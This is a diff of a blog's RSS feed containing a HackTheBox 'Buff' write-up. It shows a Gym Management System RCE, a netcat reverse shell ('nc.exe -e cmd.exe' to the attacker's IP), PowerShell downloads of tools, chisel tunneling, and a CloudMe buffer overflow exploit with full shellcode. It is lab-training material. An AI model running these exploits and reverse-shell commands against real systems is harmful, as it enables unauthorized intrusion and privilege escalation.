+</span></span><span class="line"><span class="cl"><span class="nv">payload</span> <span class="o">+=</span> b<span class="s2">&#34;\x05\x80\xce\xf1\xf5\x77\xce\x70\xf3\x3c\x48\x69&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">payload</span> <span class="o">+=</span> b<span class="s2">&#34;\x89\x2d\x3d\x8d\x3e\x4d\x14\xce\xfa\xed\xe2\xa3&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">payload</span> <span class="o">+=</span> b<span class="s2">&#34;\x9f\x7f\x7e\x1f\x13\xe8\xe1\xea\xbd\xb4\x85\x7b&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">payload</span> <span class="o">+=</span> b<span class="s2">&#34;\x35\x2b\x2a\xec\xd8\xd7\xc1\xae\x74\x7b\x08\x2b&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">payload</span> <span class="o">+=</span> b<span class="s2">&#34;\xf1\x1e\x74\x9e\x64\xc1\x17\x8d\x02\x2f\xbd\x35&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">payload</span> <span class="o">+=</span> b<span class="s2">&#34;\xae\x0f\x0c\xf5\x1e\x61\x5e\xdb\x6f\xb5\xb0\x16&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">payload</span> <span class="o">+=</span> b<span class="s2">&#34;\xa4\x95\xf5\x68\xf4\xe0\x05&#34;</span>
+</span></span></code></pre></div><p>After removed the comments and changed the payload, the <code>bofexploit.py</code> now look like this:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">socket</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">target</span> <span class="o">=</span> <span class="s2">&#34;127.0.0.1&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">padding1</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x90</span><span class="s2">&#34;</span> <span class="o">*</span> <span class="mi">1052</span>
+</span></span><span class="line"><span class="cl"><span class="n">EIP</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xB5\x42\xA8\x68</span><span class="s2">&#34;</span> <span class="c1"># 0x68A842B5 -&gt; PUSH ESP, RET</span>
+</span></span><span class="line"><span class="cl"><span class="n">NOPS</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x90</span><span class="s2">&#34;</span> <span class="o">*</span> <span class="mi">30</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xbe\xd0\xe7\xa9\x73\xd9\xc7\xd9\x74\x24\xf4\x5f</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x31\xc9\xb1\x3e\x31\x77\x12\x03\x77\x12\x83\x17</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xe3\x4b\x86\x6b\x04\x09\x69\x93\xd5\x6e\xe3\x76</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xe4\xae\x97\xf3\x57\x1f\xd3\x51\x54\xd4\xb1\x41</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xef\x98\x1d\x66\x58\x16\x78\x49\x59\x0b\xb8\xc8</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xd9\x56\xed\x2a\xe3\x98\xe0\x2b\x24\xc4\x09\x79</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xfd\x82\xbc\x6d\x8a\xdf\x7c\x06\xc0\xce\x04\xfb</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x91\xf1\x25\xaa\xaa\xab\xe5\x4d\x7e\xc0\xaf\x55</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x63\xed\x66\xee\x57\x99\x78\x26\xa6\x62\xd6\x07</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x06\x91\x26\x40\xa1\x4a\x5d\xb8\xd1\xf7\x66\x7f</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xab\x23\xe2\x9b\x0b\xa7\x54\x47\xad\x64\x02\x0c</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xa1\xc1\x40\x4a\xa6\xd4\x85\xe1\xd2\x5d\x28\x25</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x53\x25\x0f\xe1\x3f\xfd\x2e\xb0\xe5\x50\x4e\xa2</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x45\x0c\xea\xa9\x68\x59\x87\xf0\xe6\x9c\x15\x8f</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x45\x9e\x25\x8f\xf9\xf7\x14\x04\x96\x80\xa8\xcf</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xd2\x7f\xe3\x4d\x72\xe8\xaa\x04\xc6\x75\x4d\xf3</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x05\x80\xce\xf1\xf5\x77\xce\x70\xf3\x3c\x48\x69</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x89\x2d\x3d\x8d\x3e\x4d\x14\xce\xfa\xed\xe2\xa3</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x9f\x7f\x7e\x1f\x13\xe8\xe1\xea\xbd\xb4\x85\x7b</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x35\x2b\x2a\xec\xd8\xd7\xc1\xae\x74\x7b\x08\x2b</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xf1\x1e\x74\x9e\x64\xc1\x17\x8d\x02\x2f\xbd\x35</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xae\x0f\x0c\xf5\x1e\x61\x5e\xdb\x6f\xb5\xb0\x16</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xa4\x95\xf5\x68\xf4\xe0\x05</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">overrun</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;C&#34;</span> <span class="o">*</span> <span class="p">(</span><span class="mi">1500</span> <span class="err">—</span> <span class="nb">len</span><span class="p">(</span><span class="n">padding1</span> <span class="o">+</span> <span class="n">NOPS</span> <span class="o">+</span> <span class="n">EIP</span> <span class="o">+</span> <span class="n">payload</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">buf</span> <span class="o">=</span> <span class="n">padding1</span> <span class="o">+</span> <span class="n">EIP</span> <span class="o">+</span> <span class="n">NOPS</span> <span class="o">+</span> <span class="n">payload</span> <span class="o">+</span> <span class="n">overrun</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl"> <span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"> <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">target</span><span class="p">,</span><span class="mi">8888</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"> <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl"> <span class="nb">print</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">exc_value</span><span class="p">)</span>
+</span></span></code></pre></div><p>The exploit is ready, and now I’ll setup a listener on the same port with the one I’ve assigned to the payload and run the exploit afterwards.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «buff» «10.10.14.18»
+</span></span><span class="line"><span class="cl">$ python2 bofexploit.py
+</span></span></code></pre></div><p>On my listener:</p>
+<img src="imgs/image-20210502164625103.png" alt="image-20210502164625103" style="zoom:67%;" />
+<p>Now I can grab the root flag or dump the hashes.</p>
+]]></content:encoded>
+    </item>
+    
+    <item>
       <title>HackTheBox - Bucket</title>
       <link>https://fahmifj.github.io/hackthebox/bucket/</link>
       <pubDate>Sat, 24 Apr 2021 22:03:47 +0700</pubDate>
@@ -1246,291 +1528,9 @@
     </item>
     
     <item>
-      <title>HackTheBox - Buff</title>
-      <link>https://fahmifj.github.io/hackthebox/buff/</link>
-      <pubDate>Sat, 21 Nov 2020 16:09:25 +0000</pubDate>
-      
-      <guid>https://fahmifj.github.io/hackthebox/buff/</guid>
-      <description>Tunneling with Chisel to deliver a buffer overflow exploit</description>
-      <content:encoded><![CDATA[<p>Buff is a Windows machine with easy difficulty  from HackTheBox that features an open source web application called &ldquo;Gym Management System&rdquo;. The application can be exploited using a publicly available exploit. Internal enumeration discovers a program service that is bound to the loopback interface. The program is found to be vulnerable to a buffer overflow attack, and there is also a publicly available exploit to exploit it to gain access as Administrator. Because it is bound to the loopback interface, hence a setup for port forwarding is required before sending the exploit.</p>
-<h4 id="skills-learned">Skills Learned</h4>
-<ul>
-<li>Gym Management System 1.0 Exploitation</li>
-<li>Tunneling</li>
-<li>CloudMe 1.12 Exploitation</li>
-</ul>
-<h4 id="tools">Tools</h4>
-<ul>
-<li>Nmap - Preinstalled in Kali Linux</li>
-<li>searchsploit/Exploit-DB - Preinstalled in Kali Linux</li>
-<li><a href="https://github.com/jpillora/chisel/releases">chisel</a></li>
-<li>msfvenom - Preinstalled in Kali Linux</li>
-</ul>
-<h2 id="reconnaissance">Reconnaissance</h2>
-<h3 id="nmap">Nmap</h3>
-<p>An initial scan with <code>nmap</code> only discovers one port open on 8080 running an Apache web server.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «~» «10.10.14.18»
-</span></span><span class="line"><span class="cl">$ mkdir nmap<span class="p">;</span> nmap -sC -sV -oN nmap/initial-buff -v 10.10.10.198
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">PORT     STATE SERVICE VERSION
-</span></span><span class="line"><span class="cl">8080/tcp open  http    Apache httpd 2.4.43 <span class="o">((</span>Win64<span class="o">)</span> OpenSSL/1.1.1g PHP/7.4.6<span class="o">)</span>
-</span></span><span class="line"><span class="cl"><span class="p">|</span> http-methods:
-</span></span><span class="line"><span class="cl"><span class="p">|</span>_  Supported Methods: GET HEAD POST OPTIONS
-</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-open-proxy: Proxy might be redirecting requests
-</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Apache/2.4.43 <span class="o">(</span>Win64<span class="o">)</span> OpenSSL/1.1.1g PHP/7.4.6
-</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: mrb3n’s Bro Hut
-</span></span></code></pre></div><h2 id="enumeration">Enumeration</h2>
-<h3 id="tcp-8080---website">TCP 8080 - Website</h3>
-<p>Visiting port 8080 displays a website for a Gym, on the title it is called &ldquo;mrb3n&rsquo;s Bro Hut&rdquo;.</p>
-<img src="imgs/image-20210502140814680.png" alt="image-20210502140814680" style="zoom: 67%;" />
-<p>Clicking on the contact page discovers the name of the software behind this web application.</p>
-<img src="imgs/image-20210502140846741.png" alt="image-20210502140846741" style="zoom:67%;" />
-<h4 id="searchsploit">Searchsploit</h4>
-<p>I can feed the software name to <code>searchsploit</code>. It pops several exploits, and one that stands out is a remote code execution.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «machines» «10.10.14.18»
-</span></span><span class="line"><span class="cl">$ searchsploit Gym Management System 1.0
-</span></span><span class="line"><span class="cl">------------------------------------------------------------------------------- ---------------------------------
-</span></span><span class="line"><span class="cl"> Exploit Title                                                                 <span class="p">|</span>  Path
-</span></span><span class="line"><span class="cl">------------------------------------------------------------------------------- ---------------------------------
-</span></span><span class="line"><span class="cl">Gym Management System 1.0 - <span class="s1">&#39;id&#39;</span> SQL Injection                                 <span class="p">|</span> php/webapps/48936.txt
-</span></span><span class="line"><span class="cl">Gym Management System 1.0 - Authentication Bypass                              <span class="p">|</span> php/webapps/48940.txt
-</span></span><span class="line"><span class="cl">Gym Management System 1.0 - Stored Cross Site Scripting                        <span class="p">|</span> php/webapps/48941.txt
-</span></span><span class="line"><span class="cl">Gym Management System 1.0 - Unauthenticated Remote Code Execution              <span class="p">|</span> php/webapps/48506.py
-</span></span><span class="line"><span class="cl">------------------------------------------------------------------------------- ---------------------------------
-</span></span></code></pre></div><h2 id="foothold">Foothold</h2>
-<h3 id="shell-as-shaun">Shell as shaun</h3>
-<p>I will grab the unauth RCE with <code>searchsploit -m</code>, it allows me to mirror/make a copy of the &ldquo;Gym Management System 1.0 - Unauthenticated Remote Code Execution&rdquo; exploit to the current working directory</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «exploit» «10.10.14.18»
-</span></span><span class="line"><span class="cl">$ searchsploit -m <span class="m">48506</span>
-</span></span><span class="line"><span class="cl">  Exploit: Gym Management System 1.0 - Unauthenticated Remote Code Execution
-</span></span><span class="line"><span class="cl">      URL: https://www.exploit-db.com/exploits/48506
-</span></span><span class="line"><span class="cl">     Path: /usr/share/exploitdb/exploits/php/webapps/48506.py
-</span></span><span class="line"><span class="cl">File Type: Python script, ASCII text executable, with CRLF line terminators
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">Copied to: /root/htb/machines/buff/exploit/48506.py
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">→ root@kali «exploit» «10.10.14.18»
-</span></span><span class="line"><span class="cl">$ ls -l
-</span></span><span class="line"><span class="cl">total <span class="m">8</span>
-</span></span><span class="line"><span class="cl">-rwxr-xr-x <span class="m">1</span> root root <span class="m">5164</span> May  <span class="m">2</span> 04:29 48506.py
-</span></span></code></pre></div><p>I will rename <code>48506.py</code> to <code>exploit.py</code>, and run it afterwards.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «exploit» «10.10.14.18»
-</span></span><span class="line"><span class="cl">$ python exploit.py http://10.10.10.198:8080/
-</span></span></code></pre></div><img src="imgs/image-20210502153153898.png" alt="image-20210502153153898" style="zoom:67%;" />
-<p>With current webshell, I can&rsquo;t change my directory but I can still grab the user flag.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">C:<span class="se">\x</span>ampp<span class="se">\h</span>tdocs<span class="se">\g</span>ym<span class="se">\u</span>pload&gt; <span class="nb">type</span> <span class="se">\u</span>sers<span class="se">\s</span>haun<span class="se">\d</span>esktop<span class="se">\u</span>ser.txt
-</span></span></code></pre></div><h4 id="upgrade-to-interactive-shell">Upgrade to Interactive Shell</h4>
-<p>To make the shell a bit more comfy, I uploaded a <code>netcat</code> using <code>powershell</code> to Buff, and then I will create another reverse shell session.</p>
-<p>First, I will host a 64 bit netcat, <code>nc64.exe</code>.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «buff» «10.10.14.18»
-</span></span><span class="line"><span class="cl">$ python -m http.server <span class="m">80</span>
-</span></span><span class="line"><span class="cl">Serving HTTP on 0.0.0.0 port <span class="m">80</span> <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
-</span></span><span class="line"><span class="cl">10.10.10.198 - - <span class="o">[</span>14/Aug/2020 10:11:02<span class="o">]</span> <span class="s2">&#34;GET /nc64.exe HTTP/1.1&#34;</span> <span class="m">200</span>
-</span></span></code></pre></div><p>On Buff, I will grab the hosted <code>nc64.exe</code> using PowerShell.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">xampp</span><span class="p">\</span><span class="n">htdocs</span><span class="p">\</span><span class="n">gym</span><span class="p">\</span><span class="n">upload</span><span class="p">&gt;</span> <span class="n">powershell</span><span class="p">.</span><span class="n">exe</span> <span class="s2">&#34;invoke-webrequest -uri http://10.10.14.18/nc64.exe -outfile nc.exe&#34;</span>
-</span></span></code></pre></div><p>While having my netcat listening, I will send a reverse shell from Buff by leveraging the uploaded netcat.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">C:<span class="se">\x</span>ampp<span class="se">\h</span>tdocs<span class="se">\g</span>ym<span class="se">\u</span>pload&gt;.<span class="se">\n</span>c.exe -e cmd.exe 10.10.14.18 <span class="m">9001</span>
-</span></span></code></pre></div><p>On my listener:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «buff» «10.10.14.18»
-</span></span><span class="line"><span class="cl">$ nc -nvlp <span class="m">9001</span>
-</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">9001</span> ...
-</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>10.10.14.18<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.198<span class="o">]</span> <span class="m">64518</span>
-</span></span><span class="line"><span class="cl">Microsoft Windows <span class="o">[</span>Version 10.0.17134.1550<span class="o">]</span>  
-</span></span><span class="line"><span class="cl"><span class="o">(</span>c<span class="o">)</span> <span class="m">2018</span> Microsoft Corporation. All rights reserved.   
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">C:<span class="se">\x</span>ampp<span class="se">\h</span>tdocs<span class="se">\g</span>ym<span class="se">\u</span>pload&gt;
-</span></span></code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
-<h3 id="shell-as-administrator">Shell as Administrator</h3>
-<h4 id="enumeration-1">Enumeration</h4>
-<p>After enumerating the Users folder, I noticed a slightly different output when typing the <code>dir</code> command in <code>shaun</code> home directory.</p>
-<p><div class="img-container"><img src="imgs/image-20210502155544622.png" alt="image-20210502155544622"  /></div>
-</p>
-<p>In the Download folder, there is an executable file called <code>CloudMe_1112.exe</code>, where 1112 is likely a version number.</p>
-<p>Checking on currently running services with <code>netstat</code> discovers an unknown service bound on localhost port 8888.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">C:<span class="se">\x</span>ampp<span class="se">\h</span>tdocs<span class="se">\g</span>ym<span class="se">\u</span>pload&gt; netstat -aonp tcp
-</span></span><span class="line"><span class="cl">Active Connections
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">  Proto  Local Address          Foreign Address        State           PID
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...
-</span></span><span class="line"><span class="cl">  TCP    127.0.0.1:8888            0.0.0.0:0              LISTENING       <span class="m">7352</span>
-</span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...  
-</span></span></code></pre></div><p>I can search the program name using the <code>tasklist</code> command.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">C:<span class="se">\x</span>ampp<span class="se">\h</span>tdocs<span class="se">\g</span>ym<span class="se">\u</span>pload&gt; tasklist /FI <span class="s2">&#34;PID eq 7352&#34;</span> /v /FO list
-</span></span></code></pre></div><img src="imgs/image-20210502160832477.png" alt="image-20210502160832477" style="zoom:67%;" />
-<p>So PID 7352 on port 8888 is running <code>CloudMe.exe</code>, and because the user name field is showing as <strong>N/A</strong>, one possible thing is that I don’t have enough privilege to dig for more information about that process (it might be running with a higher privilege, either administrator or a local system).</p>
-<h4 id="searchsploit-1">Searchsploit</h4>
-<p>A quick search about &ldquo;CloudMe&rdquo; on <code>searchsploit</code> pops some buffer overflow exploits. Four of them are exact match. I will grab the PoC version.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «buff» «10.10.14.18»
-</span></span><span class="line"><span class="cl">$ searchsploit CloudMe
-</span></span><span class="line"><span class="cl">------------------------------------------------------------------------------- ---------------------------------
-</span></span><span class="line"><span class="cl"> Exploit Title                                                                 <span class="p">|</span>  Path
-</span></span><span class="line"><span class="cl">------------------------------------------------------------------------------- ---------------------------------
-</span></span><span class="line"><span class="cl">CloudMe 1.11.2 - Buffer Overflow <span class="o">(</span>PoC<span class="o">)</span>                                         <span class="p">|</span> windows/remote/48389.py
-</span></span><span class="line"><span class="cl">CloudMe 1.11.2 - Buffer Overflow <span class="o">(</span>SEH_DEP_ASLR<span class="o">)</span>                                <span class="p">|</span> windows/local/48499.txt
-</span></span><span class="line"><span class="cl">CloudMe 1.11.2 - Buffer Overflow ROP <span class="o">(</span>DEP_ASLR<span class="o">)</span>                                <span class="p">|</span> windows/local/48840.py
-</span></span><span class="line"><span class="cl">Cloudme 1.9 - Buffer Overflow <span class="o">(</span>DEP<span class="o">)</span> <span class="o">(</span>Metasploit<span class="o">)</span>                               <span class="p">|</span> windows_x86-64/remote/45197.rb
-</span></span><span class="line"><span class="cl">CloudMe Sync 1.10.9 - Buffer Overflow <span class="o">(</span>SEH<span class="o">)(</span>DEP Bypass<span class="o">)</span>                        <span class="p">|</span> windows_x86-64/local/45159.py
-</span></span><span class="line"><span class="cl">CloudMe Sync 1.10.9 - Stack-Based Buffer Overflow <span class="o">(</span>Metasploit<span class="o">)</span>                 <span class="p">|</span> windows/remote/44175.rb
-</span></span><span class="line"><span class="cl">CloudMe Sync 1.11.0 - Local Buffer Overflow                                    <span class="p">|</span> windows/local/44470.py
-</span></span><span class="line"><span class="cl">CloudMe Sync 1.11.2 - Buffer Overflow + Egghunt                                <span class="p">|</span> windows/remote/46218.py
-</span></span><span class="line"><span class="cl">CloudMe Sync 1.11.2 Buffer Overflow - WoW64 <span class="o">(</span>DEP Bypass<span class="o">)</span>                       <span class="p">|</span> windows_x86-64/remote/46250.py
-</span></span><span class="line"><span class="cl">CloudMe Sync &lt; 1.11.0 - Buffer Overflow                                        <span class="p">|</span> windows/remote/44027.py
-</span></span><span class="line"><span class="cl">CloudMe Sync &lt; 1.11.0 - Buffer Overflow <span class="o">(</span>SEH<span class="o">)</span> <span class="o">(</span>DEP Bypass<span class="o">)</span>                     <span class="p">|</span> windows_x86-64/remote/44784.py
-</span></span><span class="line"><span class="cl">------------------------------------------------------------------------------- ---------------------------------
-</span></span></code></pre></div><h4 id="tunneling">Tunneling</h4>
-<p>The CloudMe program is currently listening on localhost (bound), so to interact with it, I&rsquo;ll have to setup a tunnel/port forwarding. For this, I&rsquo;ll use <code>chisel</code> (<a href="https://github.com/jpillora/chisel/releases)">https://github.com/jpillora/chisel/releases)</a>.</p>
-<blockquote>
-<p>Example usage of chisel is explained better in this blog :</p>
-<ul>
-<li><a href="https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html#chisel">https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html#chisel</a></li>
-</ul>
-</blockquote>
-<p>First, I&rsquo;ll transfer the Windows version of chisel to Buff via PowerShell.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">C:<span class="se">\U</span>sers<span class="se">\s</span>haun<span class="se">\D</span>ownload&gt; powershell.exe <span class="s2">&#34;invoke-webrequest -uri http://10.10.14.18/chisel.exe -outfile cs.exe&#34;</span>
-</span></span></code></pre></div><p>Second, I&rsquo;ll setup a chisel server on my Kali.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «buff» «10.10.14.18»
-</span></span><span class="line"><span class="cl">$ chisel server -p <span class="m">9002</span>
-</span></span><span class="line"><span class="cl">2020/08/14 13:22:18 server: Fingerprint 35:fe:d3:dd:6c:b3:63:35:87:6a:f2:70:52:f1:82:e2
-</span></span><span class="line"><span class="cl">2020/08/14 13:22:18 server: Listening on 0.0.0.0:9002...
-</span></span></code></pre></div><p>On Buff, I&rsquo;ll connect as client to my chisel server on Kali.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">C:<span class="se">\U</span>sers<span class="se">\s</span>haun<span class="se">\D</span>ownload&gt; .<span class="se">\c</span>s.exe client 10.10.14.18:9002 R:8888:127.0.0.1:8888
-</span></span></code></pre></div><img src="imgs/image-20210502162654346.png" alt="image-20210502162654346" style="zoom:67%;" />
-<p>This, will forward the traffics that sent from my Kali Linux on port 8888 to Buff&rsquo;s localhost on port 8888.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">Kali localhost:8888 &lt;-&gt; (Kali 10.10.14.18:9002 &lt;-&gt; Buff:10.10.10.198:XXX) &lt;-&gt; Buff localhost:8888
-</span></span></code></pre></div><h4 id="exploitation-cloudme-1112">Exploitation CloudMe 1.11.2</h4>
-<p>I&rsquo;ll use this exploit PoC (I&rsquo;ve renamed it to <code>bofexploit.py</code>) but I&rsquo;ll have to modify the payload with my own.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># Exploit Title: CloudMe 1.11.2 - Buffer Overflow (PoC)</span>
-</span></span><span class="line"><span class="cl"><span class="c1"># Date: 2020-04-27</span>
-</span></span><span class="line"><span class="cl"><span class="c1"># Exploit Author: Andy Bowden</span>
-</span></span><span class="line"><span class="cl"><span class="c1"># Vendor Homepage: https://www.cloudme.com/en</span>
-</span></span><span class="line"><span class="cl"><span class="c1"># Software Link: https://www.cloudme.com/downloads/CloudMe_1112.exe</span>
-</span></span><span class="line"><span class="cl"><span class="c1"># Version: CloudMe 1.11.2</span>
-</span></span><span class="line"><span class="cl"><span class="c1"># Tested on: Windows 10 x86</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="c1">#Instructions:</span>
-</span></span><span class="line"><span class="cl"><span class="c1"># Start the CloudMe service and run the script.</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">socket</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="n">target</span> <span class="o">=</span> <span class="s2">&#34;127.0.0.1&#34;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="n">padding1</span>   <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x90</span><span class="s2">&#34;</span> <span class="o">*</span> <span class="mi">1052</span>
